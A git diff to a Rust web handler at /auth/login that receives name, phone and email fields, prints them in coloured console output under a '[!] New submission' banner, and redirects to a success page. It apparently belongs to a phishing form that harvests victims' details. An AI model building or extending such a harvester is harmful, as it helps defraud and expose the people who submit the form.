@@ -12,10 +12,15 @@ struct InfoForm {
 
 #[post("/auth/login")]
 pub async fn submit(form: web::Form<InfoForm>) -> HttpResponse {
-    println!("{}", "[!] New submission".blue().bold());
+    println!("{}", "[!] New submission".bright_blue().bold());
     print!(
-        "\tName: {}\nPhone: {}\nEmail: {}",
-        form.name, form.phone, form.email
+        "\n{}: {}\n\t{}: {}\n\t{}: {}\n",
+        "Name".bright_red().bold(),
+        form.name,
+        "Phone".bright_red().bold(),
+        form.phone,
+        "Email".bright_red().bold(),
+        form.email
     );
     HttpResponse::Found()
         .insert_header((header::LOCATION, "/success.html"))
